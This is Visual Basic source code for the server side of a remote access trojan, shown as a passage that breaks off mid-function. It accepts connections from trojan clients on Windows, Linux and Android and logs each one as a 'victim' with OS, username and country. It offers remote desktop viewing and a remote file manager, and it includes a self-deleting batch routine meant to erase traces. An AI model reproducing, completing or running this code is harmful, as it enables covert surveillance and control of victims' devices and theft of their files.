Imports System.IO
Imports System.Security.Cryptography
Imports System.Management
Imports RestSharp
Imports System.Net
'##################################################
'################### CODED  #######################
'##################### BY #########################
'############### Saher Blue Eagle  ################
'###############  XPR OPEN SOURCE  ################
'##################################################
'##################################################
Public Class Form1


    Private YY As String = "||"
    Private Const spl As String = "abccba"
    Private بناء_تروجان_exe As New Build_EXE_Trojan
    Private alaa(), text1, text2, text3 As String
    Private cap As New CRDP
    Private reg_p As String = "null"
    Private FirstFIVE As String = ""
    Private if_fm_download As Boolean = False
    Private PC_ID As String = ""
    Private Serial_ID As String = ""
    Private bakserial As String = ""
    Private if_fm_undercontrol As Boolean = False
    Private if_android_fm_underC As Boolean = False
    Private if_android_sms_underC As Boolean = False
    Private if_android_cam_underC As Boolean = False
    Private master_sock As Integer = -1
    Private Shared c As New TripleDESCryptoServiceProvider
    Private Shared e As New MD5CryptoServiceProvider
    Private port As Integer
    Protected Friend Function RET_PORT() As Integer
        Return port
    End Function
    Protected Friend WithEvents Server As New SocketServer
    Private Sub Self_Destroy()
        Try
            If IO.Directory.Exists(Application.StartupPath & "\" & "Program_Backup" & bakserial) Then
                If IO.File.Exists(Application.StartupPath & "\" & "Program_Backup" & bakserial & "\Installed_XPT_Tool_Backup.exe") Then
                    If IO.File.Exists(Application.StartupPath & "\" & "Program_Backup" & bakserial & "\RestSharp.dll") Then
                        Exit Try
                    End If
                End If
            End If
            Dim procDestruct As Process = New Process()

            Dim strName As String = "destruct.bat"

            Dim strPath As String = Path.Combine _
               (Directory.GetCurrentDirectory(), strName)
            Dim strExe As String = New  _
               FileInfo(Application.ExecutablePath).Name
            Dim swDestruct As StreamWriter = New StreamWriter(strPath)

            swDestruct.WriteLine("attrib """ & strExe & """" & _
               " -a -s -r -h")
            swDestruct.WriteLine(":Repeat")
            swDestruct.WriteLine("del " & """" & strExe & """")
            swDestruct.WriteLine("if exist """ & strExe & """" & _
               " goto Repeat")
            swDestruct.WriteLine("del """ & strName & """")

            swDestruct.Close()

            procDestruct.StartInfo.FileName = "destruct.bat"
            procDestruct.StartInfo.CreateNoWindow = True
            procDestruct.StartInfo.UseShellExecute = False

            Try

                procDestruct.Start()

            Catch ex As Exception

                Close()

            End Try
        Catch ex As Exception

        End Try

        End
    End Sub


    Private start_date As String = "null"
    Private current_date As String = "null"
    Private remaining_days As Integer = 0


    Class GoogleTimeZone
        Public Property dstOffset As Double
        Public Property rawOffset As Double
        Public Property status As String
        Public Property timeZoneId As String
        Public Property timeZoneName As String
    End Class
    Private Function GetLocalDateTime(ByVal latitude As Double, ByVal longitude As Double, ByVal utcDate As DateTime) As DateTime
        Dim client = New RestClient("https://maps.googleapis.com")
        Dim request = New RestRequest("maps/api/timezone/json", Method.GET)
        request.AddParameter("location", latitude & "," & longitude)
        request.AddParameter("timestamp", utcDate.ToTimestamp)
        request.AddParameter("sensor", "false")
        Dim response = client.Execute(Of GoogleTimeZone)(request) 'client.Execute < GoogleTimeZone > (request)
        Return utcDate.AddSeconds(response.Data.rawOffset + response.Data.dstOffset)
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        if_fm_undercontrol = False

        Start_NORMAL()





    End Sub
    Public Shared Function A(ByVal b As String) As Byte()
        Return e.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(b))
    End Function
    Private Function GET_FOUR(ByVal input As String) As String
        Dim result As String = ""
        Dim coi As Integer = 0
        For Each chara As String In input

            result &= chara
            If coi = 3 Then
                Exit For
            End If
            coi += 1
        Next
        Return result
    End Function



    Private Sub Start_NORMAL()

        Try
            Control.CheckForIllegalCrossThreadCalls = False
SRELINE:    port = Integer.Parse(InputBox("Enter port to listen", "Port Entry [Numbers Only]", 1166))
            Try
                Server.Start(port)
                Label4.Text = "Listening on Port : " & port
                ListBox1.Items.Add("TCP Listner Started @Port : " & "Listenport=" & port)
                Prepare_Listview_imageList_N()
                Timer1.Start()
            Catch ex As Exception
                MsgBox("cannot start on port " & port & vbNewLine & "Exception : " & vbNewLine & ex.Message)
                GoTo SRELINE
            End Try
        Catch ex As Exception
            MsgBox(port & " is invalid number entry")
            GoTo SRELINE
        End Try
        'TakeBackup()
        ' Clear_Phrases()
    End Sub

    Private Sub Connected_client(ByVal sock As Integer) Handles Server.Connected
        Server.Send(sock, "info" & SplitData)
        'Server.Send_DX(sock, "info" & SplitData)
        '
        ListBox1.Items.Add("New connection : " & Server.IP(sock))
        'Server.Send(sock, "Send_info" & SplitData) fail
        'Server.Send(sock, "camera_manager_find_camera" & SplitData) test cam for apk 'success

    End Sub
    Private Sub Disonnected_client(ByVal sock As Integer) Handles Server.DisConnected
        Try
            ListBox1.Items.Add("Disconnected : " & Server.IP(sock))

RETRYLINE:
            Me.client_list_l1.Items(sock).Remove()
            ListBox1.Items.Add("Remove : " & Server.IP(sock))
            Me.client_list_l1.Update()
        Catch ex As Exception
            '   MsgBox("Disonnected_client Exception : " & vbNewLine & ex.Message)
            ' sock -= 1
            '  GoTo RETRYLINE
            For Each item As ListViewItem In client_list_l1.Items

                If item.SubItems(4).Text.Equals(Server.IP(sock)) Then
                    client_list_l1.Items.Remove(item)
                    ListBox1.Items.Add("ITEM Removed : " & Server.IP(sock))
                    Me.client_list_l1.Update()
                    Exit Sub
                End If

            Next
        End Try
    End Sub
    Private Sub Prepare_Listview_imageList()
        OS_Img_List.Images.Add(My.Resources.WindowsXP) '0
        OS_Img_List.ImageSize = New Size(125, 110)

        OS_Img_List.Images.Add(My.Resources.Windows7) '1
        OS_Img_List.Images.Add(My.Resources.Windows_Vista) '2
        OS_Img_List.Images.Add(My.Resources.Windows10) '3
        OS_Img_List.Images.Add(My.Resources.mac_c) '4
        OS_Img_List.Images.Add(My.Resources.linux) '5
        OS_Img_List.Images.Add(My.Resources.unknowen) '6


        '  ------------------------------------------ Adding Jar on Windows

        OS_Img_List.Images.Add(My.Resources.WindowsXP_jar) '7
        OS_Img_List.Images.Add(My.Resources.Windows7_jar) '8
        OS_Img_List.Images.Add(My.Resources.Windows_Vista_jar) '9
        OS_Img_List.Images.Add(My.Resources.Windows10_jar) '10
        OS_Img_List.Images.Add(My.Resources.unknowen_jar) '11

        '  ------------------------------------------ Adding Android icons

        OS_Img_List.Images.Add(My.Resources.Android2) '12
        '  OS_Img_List.Images.Add(My.Resources.andor) '13




    End Sub
    Private Function Redsign_Android_array(ByVal target_array As String()) As String
        Dim REF_STRG As String = ""
        For Each x As String In target_array
            If x.Equals(split_Ary) Or x.Equals(split_Line) Or x.Equals(Split_Packets) Or x.Equals(SplitData) Or x.Equals(split_paths) Then
                GoTo ESC
            Else
                REF_STRG = REF_STRG & x & "||"
            End If
ESC:
        Next
        Return REF_STRG
    End Function
    Private Function Return_Byte_array(ByVal s As String) As Byte() ' string to byte array
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Private Function Return_String(ByVal b As Byte()) As String ' byte array to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Private Function Clear_Packets_From_Splitter_String(ByVal Incomming_Byte_Aray As Byte(), ByVal Splitter_Str As String) As Array ' clear incomming packets from splitter
        On Error Resume Next
        Dim Array_List As New List(Of Byte())
        Dim Stream1 As New IO.MemoryStream
        Dim Stream2 As New IO.MemoryStream
        Dim T As String() = Split(Return_String(Incomming_Byte_Aray), Splitter_Str)
        Stream1.Write(Incomming_Byte_Aray, 0, T(0).Length)
        Stream2.Write(Incomming_Byte_Aray, T(0).Length + Splitter_Str.Length, Incomming_Byte_Aray.Length - (T(0).Length + Splitter_Str.Length))
        Array_List.Add(Stream1.ToArray)
        Array_List.Add(Stream2.ToArray)
        Stream1.Dispose()
        Stream2.Dispose()
        Return Array_List.ToArray
    End Function
    Private Function Return_OS_INDEX(ByVal OS_Name As String)
        If is_now_jar_getting_OS = False Then
            '
            If OS_Name.Contains("xp") Or OS_Name.Contains("XP") Or OS_Name.Contains("Xp") Then
                Return 0

            ElseIf OS_Name.Contains("7") Or OS_Name.Contains("Seven") Or OS_Name.Contains("even") Or OS_Name.Contains("2008") Then
                Return 1
            ElseIf OS_Name.Contains("ta") Or OS_Name.Contains("Vista") Or OS_Name.Contains("VISTA") Or OS_Name.Contains("2007") Then
                Return 2
            ElseIf OS_Name.Contains("MAC") Or OS_Name.Contains("Mac") Or OS_Name.Contains("mac") Or OS_Name.Contains("tosch") Or OS_Name.Contains("Apple") Or OS_Name.Contains("apple") Or OS_Name.Contains("APPLE") Or OS_Name.Contains("IOS") Or OS_Name.Contains("Ios") Or OS_Name.Contains("iOS") Or OS_Name.Contains("iOs") Or OS_Name.Contains("ios") Or OS_Name.Contains("OS X") Or OS_Name.Contains("os x") Then

                Return 4
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 12 'or 13
            ElseIf OS_Name.Contains("Linux") Or OS_Name.Contains("LINUX") Or OS_Name.Contains("linux") Or OS_Name.Contains("GNU") Or OS_Name.Contains("debian") Or OS_Name.Contains("Gnu") Or OS_Name.Contains("tu") Or OS_Name.Contains("Ubunt") Then ' Then

                Return 5
            ElseIf OS_Name.Contains("10") Or OS_Name.Contains("1") Or OS_Name.Contains("8") Or OS_Name.Contains("8.1") Or OS_Name.Contains("2012") Or OS_Name.Contains("2010") Then
                Return 3
            ElseIf OS_Name.Contains("2000") Or OS_Name.Contains("2003") Or OS_Name.Contains("2002") Or OS_Name.Contains("2001") Then
                Return 0
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 12 'or 13

            Else
                Return 6
            End If
        ElseIf is_now_jar_getting_OS = True Then
            ' OS_Img_List.ImageSize = New Size(125, 110)
            If OS_Name.Contains("xp") Or OS_Name.Contains("XP") Or OS_Name.Contains("Xp") Then
                Return 7
            ElseIf OS_Name.Contains("7") Or OS_Name.Contains("Seven") Or OS_Name.Contains("even") Or OS_Name.Contains("2008") Then
                Return 8
            ElseIf OS_Name.Contains("ta") Or OS_Name.Contains("Vista") Or OS_Name.Contains("VISTA") Or OS_Name.Contains("2007") Then
                Return 9
            ElseIf OS_Name.Contains("MAC") Or OS_Name.Contains("Mac") Or OS_Name.Contains("mac") Or OS_Name.Contains("tosch") Or OS_Name.Contains("Apple") Or OS_Name.Contains("apple") Or OS_Name.Contains("APPLE") Or OS_Name.Contains("IOS") Or OS_Name.Contains("Ios") Or OS_Name.Contains("iOS") Or OS_Name.Contains("iOs") Or OS_Name.Contains("ios") Or OS_Name.Contains("OS X") Or OS_Name.Contains("os x") Then

                Return 4
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 12 'or 13
            ElseIf OS_Name.Contains("Linux") Or OS_Name.Contains("LINUX") Or OS_Name.Contains("linux") Or OS_Name.Contains("GNU") Or OS_Name.Contains("debian") Or OS_Name.Contains("Gnu") Or OS_Name.Contains("tu") Or OS_Name.Contains("Ubunt") Then ' Then

                Return 5

            ElseIf OS_Name.Contains("10") Or OS_Name.Contains("1") Or OS_Name.Contains("8") Or OS_Name.Contains("8.1") Or OS_Name.Contains("2012") Or OS_Name.Contains("2010") Then
                Return 10
            ElseIf OS_Name.Contains("2000") Or OS_Name.Contains("2003") Or OS_Name.Contains("2002") Or OS_Name.Contains("2001") Then
                Return 7
            ElseIf OS_Name.Contains("Android") Or OS_Name.Contains("And") Or OS_Name.Contains("roid") Or OS_Name.Contains("ROID") Then
                Return 12 'or 13
                OS_Img_List.ImageSize = New Size(80, 100)
            Else
                Return 11
            End If
        End If

    End Function
    Friend Function ret_notif_OS(ByVal os As String) As Integer
        Return Return_OS_INDEX(os)
    End Function
    Friend Function GetImageList() As ImageList
        Return OS_Img_List
    End Function
    'Private Function Check_IF_EXISTS(ByVal text As String, ByVal by_sock As Integer) As Boolean
    '    For Each itm As ListViewItem In client_list_l1.Items

    '        If itm.SubItems(4).Text.Equals(text) And itm.ToolTipText = by_sock Then
    '            Return False
    '        Else
    '            Return False
    '        End If
    '    Next
    '    Return False
    'End Function
    Private Function getFolders(ByVal location) As String
        Dim di As New IO.DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As IO.DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Private Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    Delegate Sub _Handle_Data_Event(ByVal sock As Integer, ByVal b As Byte())
    Private Sub Handle_Data_Event(ByVal sock As Integer, ByVal bytearray As Byte()) Handles Server.Data

        Try

            If BSS(bytearray).Contains(split_Ary) Or BSS(bytearray).Contains(split_Line) Or BSS(bytearray).Contains(Split_Packets) Or BSS(bytearray).Contains(SplitData) Or BSS(bytearray).Contains(split_paths) Or BSS(bytearray).Contains(Syn) Then
                GoTo Android_Part
            Else
                GoTo Computers_Part
            End If
Computers_Part:



            Dim StringArray As String() = Split(BSS(bytearray), "||")

            Select Case StringArray(0)
                Case "info"
                    Try

                        Try
                            If My.Application.OpenForms("notif_X" & sock) IsNot Nothing Then Exit Sub
                            If Me.InvokeRequired Then
                                Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                Me.Invoke(j, New Object() {sock, bytearray})
                                Exit Sub
                            End If
                            Dim CompForm As New Notification
                            CompForm.sock = sock
                            CompForm.Name = "notif_X" & sock
                            CompForm.Label9.Text = Server.IP(sock)
                            CompForm.Label5.Text = StringArray(1)
                            CompForm.Label7.Text = StringArray(2)
                            CompForm.Label6.Text = StringArray(3)
                            CompForm.Label8.Text = StringArray(4)
                            CompForm.Show()
                        Catch ex As Exception

                        End Try


                        Dim computer_country As String = StringArray(4)
                        Dim computer_OS As String = StringArray(3)

                        Dim Computer_trojan_name As String = StringArray(1)
                        Dim computer_username As String = StringArray(2)

                        Dim lx As ListViewItem = client_list_l1.Items.Add(sock.ToString, Computer_trojan_name, Get_VICOS_IMG_index(computer_OS))
                        Try
                            ListBox1.Items.Add("New Victim : " & Server.IP(sock) & " | OS : " & computer_OS & " | Country : " & computer_country)
                        Catch ex As Exception

                        End Try
                        lx.ToolTipText = sock
                        lx.SubItems.Add("Computer" & vbNewLine & "User : " & computer_username)
                        lx.SubItems.Add(computer_OS)
                        lx.SubItems.Add(computer_country)
                        lx.SubItems.Add(Server.IP(sock))
                        Try
                            Dim computer_Trojan_type As String = StringArray(6)
                            If computer_Trojan_type.Equals("win-jar") Then
                                lx.SubItems.Add("jar Trojan Running on Windows PC")
                                Exit Try
                            ElseIf computer_Trojan_type.Equals("linux") Then
                                lx.SubItems.Add("jar Trojan Running on linux PC")
                                Exit Try
                            ElseIf computer_Trojan_type.Contains("exe") Then
                                lx.SubItems.Add("exe Trojan Running on Windows PC")
                                Exit Try
                            ElseIf Computer_trojan_name.Contains("VB-troja") Then
                                lx.SubItems.Add("exe Trojan Running on Windows PC")
                                Exit Try
                            Else
                                lx.SubItems.Add(computer_Trojan_type)
                                Exit Try
                            End If

                        Catch ex As Exception
                            Try
                                If Computer_trojan_name.Equals("win-jar") Then
                                    lx.SubItems.Add("jar Trojan Running on Windows PC")
                                    Exit Try
                                ElseIf Computer_trojan_name.Equals("linux") Then
                                    lx.SubItems.Add("jar Trojan Running on linux PC")
                                    Exit Try
                                ElseIf Computer_trojan_name.Contains("java") Then
                                    lx.SubItems.Add("jar Trojan Running ")
                                    Exit Try

                                ElseIf Computer_trojan_name.Contains("VB-troja") Then
                                    lx.SubItems.Add("exe Trojan Running on Windows PC")
                                    Exit Try

                                End If
                            Catch exc As Exception

                            End Try
                        End Try
                        'Make notification 

                    Catch ex As Exception

                    End Try

                Case "@" 'From VB Client

                    Try
                        Dim Desktop_form As RDP = My.Application.OpenForms("dskt" & sock)
                        Dim BB As Byte() = Clear_Packets_From_Splitter_String(bytearray, "@" & "||")(1)
                        Desktop_form.PktToImage(BB, Nothing)

                    Catch ex As Exception

                    End Try
                Case "rdp" 'From JAVA  get desktop screen
                    Try

                        Dim Desktop_form As RDP = My.Application.OpenForms("dskt" & sock)

                        Dim picbyte() As Byte = Convert.FromBase64String(StringArray(1))
                        Dim ms As New MemoryStream(picbyte)
                        Desktop_form.PktToImage(Nothing, Image.FromStream(ms))



                    Catch ex As Exception

                    End Try

                Case "desktop"
                    Try
                        If My.Application.OpenForms("dskt" & sock) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                            Me.Invoke(j, New Object() {sock, bytearray})
                            Exit Sub
                        End If
                        Dim CompForm As New RDP
                        CompForm.sock = sock
                        CompForm.Name = "dskt" & sock
                        CompForm.Sz = New Size(StringArray(1), StringArray(2))
                        CompForm.Text &= " " & Server.IP(sock)
                        CompForm.After_Load()
                        CompForm.Show()


                    Catch ex As Exception

                        If StringArray(1).Equals("Java") Then
                            Dim dimentions As String() = Split(StringArray(2), "|")
                            Dim wid As Integer = Integer.Parse(dimentions(0))
                            Dim heig As Integer = Integer.Parse(dimentions(1))

                            If My.Application.OpenForms("dskt" & sock) IsNot Nothing Then Exit Sub
                            If Me.InvokeRequired Then
                                Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                Me.Invoke(j, New Object() {sock, bytearray})
                                Exit Sub
                            End If
                            Dim CompForm As New RDP
                            CompForm.sock = sock
                            CompForm.Name = "dskt" & sock
                            CompForm.real_w = wid
                            CompForm.real_h = heig
                            CompForm.Sz = New Size(heig, wid) 'wid, heig)
                            CompForm.Text &= " " & Server.IP(sock)
                            CompForm.Show()
                            CompForm.it_is_JAVA()
                            CompForm.After_Load()
                            CompForm.KeyPreview = True





                        End If
                    End Try


                Case "fm"
                  
                    If if_fm_undercontrol = True Then

                        If master_sock > -1 Then



                            Dim vc_ip As String = Server.IP(sock)

                            For Each item As ListViewItem In client_list_l1.Items
                                If item.SubItems(4).Text.Equals(vc_ip) Then
                                    'check if java or VB
                                    If item.SubItems(5).Text.Equals("jar Trojan Running on Windows PC") Or item.SubItems(5).Text.Equals("jar Trojan Running on linux PC") Then
                                        Server.Send(master_sock, "open_fm_vc" & YY & Server.IP(sock) & YY & "jar" & YY)

                                        if_fm_undercontrol = False
                                        master_sock = -1
                                    ElseIf item.SubItems(5).Text.Contains("jar") Then
                                        Server.Send(master_sock, "open_fm_vc" & YY & Server.IP(sock) & YY & "jar" & YY)

                                        if_fm_undercontrol = False
                                        master_sock = -1
                                    Else
                                        Server.Send(master_sock, "open_fm_vc" & YY & Server.IP(sock) & YY & "vb" & YY)

                                        if_fm_undercontrol = False
                                        master_sock = -1
                                    End If


                                    Exit For
                                End If
                            Next

                        End If
                        'send to master 

                    Else

                        Try
                            If My.Application.OpenForms("fmg" & sock) IsNot Nothing Then Exit Sub
                            If Me.InvokeRequired Then
                                Dim j As New _Handle_Data_Event(AddressOf Handle_Data_Event)
                                Me.Invoke(j, New Object() {sock, bytearray})
                                Exit Sub
                            End If
                            Dim CompForm As New FileManager
                            CompForm.sock = sock
                            CompForm.Name = "fmg" & sock
                            CompForm.Text &= " " & Server.IP(sock)

                            For Each itm As ListViewItem In Me.client_list_l1.Items
                                If itm.ToolTipText = sock Then
                                    If itm.SubItems(5).Text.Equals("jar Trojan Running on Windows PC") Or itm.SubItems(5).Text.Equals("jar Trojan Running on linux PC") Or itm.SubItems(5).Text.Contains("ma") Or itm.SubItems(2).Text.Contains("MAC") Or itm.SubItems(2).Text.Contains("Mac") Or itm.SubItems(2).Text.Contains("darwin") Or itm.SubItems(2).Text.Contains("Solar") Or itm.SubItems(2).Text.Contains("SOLAR") Or itm.SubItems(2).Text.Contains("suno") Or itm.SubItems(2).Text.Contains("sola") Then
                                        CompForm.it_is_JAVA()
                                    ElseIf itm.SubItems(0).Text.Contains("Java") Then
                                        CompForm.it_is_JAVA()
                                    End If

                                End If
                            Next
                            CompForm.Show()


                        Catch ex As Exception
                            MsgBox(ex.Message)
                        End Try
                    End If




                Case "drive" 'From JAVA Client  get drives 

                    If if_fm_undercontrol = True Then


                        If master_sock > -1 Then
                            Server.Send(master_sock, "javdriveke" & YY & Server.IP(sock) & YY & StringArray(1) & YY & StringArray(2) & YY)


                        End If

                    Else
                        Try
                            Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)
                            Dim dr As New ListViewItem
                            dr.Text = StringArray(1)

                            If StringArray(2).Contains("Fix") Or StringArray(2).Contains("Local") Then
                                dr.ImageIndex = 2
                                dr.SubItems.Add(StringArray(2) & " Drive")
                            ElseIf StringArray(2).Contains("CD") Then
                                dr.ImageIndex = 5
                                dr.SubItems.Add(StringArray(2) & " Drive")
                            ElseIf StringArray(2).Contains("Remov") Then
                                dr.ImageIndex = 3
                                dr.SubItems.Add(StringArray(2) & " Drive")
                            ElseIf StringArray(2).Contains("Net") Then
                                dr.ImageIndex = 4
                                dr.SubItems.Add(StringArray(2) & " Drive")
                            ElseIf StringArray(2).Contains("nul") Then
                                dr.SubItems.Add("sda Drive")
                            Else
                                dr.ImageIndex = 3
                                dr.SubItems.Add(StringArray(2) & " Drive")
                            End If
                            File_Manager_Form.ListView1.Items.Add(dr)



                        Catch ex As Exception

                        End Try
                    End If

                Case "fileitem" 'From JAVA Client get file or folder item
                    If if_fm_undercontrol = True Then


                        If master_sock > -1 Then
                            Server.Send(master_sock, "javfileon" & YY & Server.IP(sock) & YY & StringArray(1) & YY & StringArray(2) & YY)


                        End If

                    Else
                        Try
                            Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)
                            Dim itm As New ListViewItem
                            itm.Text = StringArray(1)

                            If itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".svr") Then
                                itm.ImageIndex = 16
                                itm.SubItems.Add("Win 32 exe file")
                            ElseIf itm.Text.EndsWith(".pdf") Then
                                itm.ImageIndex = 8
                                itm.SubItems.Add("Protected Document Format file")
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".md") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".tex") Or itm.Text.EndsWith(".wpd") Or itm.Text.EndsWith(".wks  ") Then
                                itm.ImageIndex = 9
                                itm.SubItems.Add("Plain Text file")
                            ElseIf itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".mwv") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
                                itm.ImageIndex = 10
                                itm.SubItems.Add("Video file")
                            ElseIf itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".ea") Or itm.Text.EndsWith(".aif") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".aifc") Or itm.Text.EndsWith(".midi") Then
                                itm.ImageIndex = 11
                                itm.SubItems.Add("Audio file")
                            ElseIf itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".cgi") Or itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".cnf") Or itm.Text.EndsWith(".tcp") Or itm.Text.EndsWith(".toml") Or itm.Text.EndsWith(".yaml") Or itm.Text.EndsWith(".json") Or itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".cfg") Or itm.Text.EndsWith(".pro") Or itm.Text.EndsWith(".ecu") Or itm.Text.EndsWith(".ica") Then
                                itm.ImageIndex = 12
                                itm.SubItems.Add("System Core file")
                            ElseIf itm.Text.EndsWith(".bat") Then
                                itm.ImageIndex = 13
                                itm.SubItems.Add("Command Batch file")
                            ElseIf itm.Text.EndsWith(".dll") Then
                                itm.ImageIndex = 14
                                itm.SubItems.Add("Dynamic Link Library file")
                            ElseIf itm.Text.EndsWith(".asp") Or itm.Text.EndsWith(".aspx") Or itm.Text.EndsWith(".cer") Or itm.Text.EndsWith(".cfm") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".jsp") Or itm.Text.EndsWith(".part") Or itm.Text.EndsWith(".php") Or itm.Text.EndsWith(".rss") Or itm.Text.EndsWith(".xhtml") Or itm.Text.EndsWith(".php5") Then
                                itm.ImageIndex = 15
                                itm.SubItems.Add("Compiled Web Application file")
                            Else
                                itm.ImageIndex = 7
                                itm.SubItems.Add("Unrecognized file to the Trojan")
                            End If
                            itm.SubItems.Add(StringArray(2))
                            File_Manager_Form.ListView1.Items.Add(itm)

                        Catch ex As Exception

                        End Try
                    End If


                Case "folderitem" 'From JAVA Client get file or folder item
                    If if_fm_undercontrol = True Then


                        If master_sock > -1 Then
                            Server.Send(master_sock, "javfilefolder" & YY & Server.IP(sock) & YY & StringArray(1) & YY)


                        End If

                    Else
                        Try
                            Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)
                            Dim itm As New ListViewItem
                            itm.Text = StringArray(1)
                            itm.ImageIndex = 6
                            itm.SubItems.Add("File Folder")
                            File_Manager_Form.ListView1.Items.Add(itm)

                        Catch ex As Exception

                        End Try
                    End If







                Case "filemanager" 'From VBClient
                    If if_fm_undercontrol = True Then
                        If master_sock > -1 Then
                            'MsgBox("vc_fm_filemanager" & YY & Server.IP(sock) & YY & StringArray(1) & YY)
                            Server.Send(master_sock, "vc_fm_filemanager" & YY & Server.IP(sock) & YY & StringArray(1) & YY)
                            if_fm_undercontrol = False
                            master_sock = -1
                        End If
                        'send to master 

                    Else
                        '
                        Try

                            Dim File_Manager_Form As FileManager = My.Application.OpenForms("fmg" & sock)
                            If StringArray(1) = "Error" Then
                                File_Manager_Form.back()
                            Else
                                Dim allFiles As String() = Split(StringArray(1), "FileManagerSplit")
                                For i = 0 To allFiles.Length - 2

                                    Dim itm As New ListViewItem
                                    itm.Text = allFiles(i)
                                    itm.SubItems.Add(allFiles(i + 1))

                                    Try
                                        If Not itm.Text.StartsWith("[Folder]") Then 'It`s a file 
                                            Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                            If fsize > 1073741824 Then
                                                Dim size As Double = fsize / 1073741824
                                                itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                            ElseIf fsize > 1048576 Then
                                                Dim size As Double = fsize / 1048576
                                                itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                            ElseIf fsize > 1024 Then
                                                Dim size As Double = fsize / 1024
                                                itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                            Else
                                                itm.SubItems(1).Text = fsize.ToString & " B"
                                            End If
                                            itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                        End If
                                    Catch ex As Exception

                                    End Try

                                    If itm.Text.StartsWith("[Folder]") Then
                                        itm.ImageIndex = 6
                                        itm.Text = itm.Text.Substring(8)
                                        itm.SubItems.Add("File Folder")
                                    ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".svr") Then
                                        itm.ImageIndex = 16
                                        itm.SubItems.Add("Win 32 exe file")
                                    ElseIf itm.Text.EndsWith(".pdf") Then
                                        itm.ImageIndex = 16
                                        itm.SubItems.Add("Protected Document Format file")
                                    ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".md") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".tex") Or itm.Text.EndsWith(".wpd") Or itm.Text.EndsWith(".wks  ") Then
                                        itm.ImageIndex = 9
                                        itm.SubItems.Add("Plain Text file")
                                    ElseIf itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".mwv") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
                                        itm.ImageIndex = 10
                                        itm.SubItems.Add("Video file")
                                    ElseIf itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".ea") Or itm.Text.EndsWith(".aif") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".aifc") Or itm.Text.EndsWith(".midi") Then
                                        itm.ImageIndex = 11
                                        itm.SubItems.Add("Audio file")
                                    ElseIf itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".cgi") Or itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".cnf") Or itm.Text.EndsWith(".tcp") Or itm.Text.EndsWith(".toml") Or itm.Text.EndsWith(".yaml") Or itm.Text.EndsWith(".json") Or itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".cfg") Or itm.Text.EndsWith(".pro") Or itm.Text.EndsWith(".ecu") Or itm.Text.EndsWith(".ica") Then
                                        itm.ImageIndex = 12
                                        itm.SubItems.Add("System Core file")
                                    ElseIf itm.Text.EndsWith(".bat") Then
                                        itm.ImageIndex = 13
                                        itm.SubItems.Add("Command Batch file")
                                    ElseIf itm.Text.EndsWith(".dll") Then
                                        itm.ImageIndex = 14
                                        itm.SubItems.Add("Dynamic Link Library file")
